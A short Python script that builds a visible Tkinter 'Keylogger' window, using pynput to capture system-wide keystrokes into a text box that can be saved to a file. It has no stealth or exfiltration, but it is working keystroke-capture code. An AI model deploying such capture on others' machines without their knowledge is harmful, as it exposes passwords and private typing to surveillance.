from tkinter import Tk, Text, END, Button, Label, Frame, filedialog
from pynput.keyboard import Listener

def on_press(key):
    key_data = str(key).replace("'", "")
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif 'Key' in key_data: 
        key_data = ''
    
    text_box.insert(END, key_data)

def clear_text():
    text_box.delete(1.0, END)

def save_text():
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
    if file_path:
        with open(file_path, 'w') as file:
            file.write(text_box.get(1.0, END))

def start_keylogger():
    global listener
    listener = Listener(on_press=on_press)
    listener.start()
    status_label.config(text="Status: Running")

def stop_keylogger():
    global listener
    listener.stop()
    status_label.config(text="Status: Stopped")

root = Tk()
root.title("Keylogger")

frame = Frame(root)
frame.pack(pady=10)

text_box = Text(frame, height=15, width=50)
text_box.pack(side="left", padx=10)

button_frame = Frame(root)
button_frame.pack(pady=10)

clear_button = Button(button_frame, text="Clear", command=clear_text)
clear_button.pack(side="left", padx=5)

save_button = Button(button_frame, text="Save", command=save_text)
save_button.pack(side="left", padx=5)

start_button = Button(button_frame, text="Start", command=start_keylogger)
start_button.pack(side="left", padx=5)

stop_button = Button(button_frame, text="Stop", command=stop_keylogger)
stop_button.pack(side="left", padx=5)

status_label = Label(root, text="Status: Stopped")
status_label.pack(pady=5)

root.mainloop()